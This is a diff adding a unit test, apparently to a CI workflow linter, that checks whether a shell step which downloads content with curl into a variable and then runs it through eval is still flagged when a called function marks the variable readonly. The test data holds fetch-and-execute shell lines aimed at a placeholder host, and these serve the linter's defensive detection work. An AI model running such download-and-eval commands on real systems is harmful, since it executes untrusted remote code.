@@ -2002,6 +2002,23 @@ class TestADownloadCarriedInAVariable(unittest.TestCase):
                     )])
                     self.assertEqual(1, len(why), why)
 
+    def test_2437_a_called_body_carries_global_readonly_state_back(self):
+        rows = (
+            ("f() { readonly X; }\nf\nX=safe\n", "readonly"),
+            ("f() { declare -gr X; }\nf\nX=safe\n", "declare -gr"),
+            ("f() { readonly X; }\nX=safe\nf\n", "late call control"),
+        )
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        for between, row in rows:
+            for shell in self.SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    # #2437 keeps a caller's replacement fail-closed after a called body makes
+                    # its target readonly; the late-call control was already reported.
+                    why = wg.job_defects([wg.Step(
+                        "run", get + between + 'eval "$X"\n', shell
+                    )])
+                    self.assertEqual(1, len(why), why)
+
     def test_2437_a_skipped_or_child_reassignment_keeps_the_download(self):
         controls = ("{ x=1; } | cat\n", "{ x=1; } &\nwait\n",
                     ("{\n  x=1\n} 2>/dev/null < "
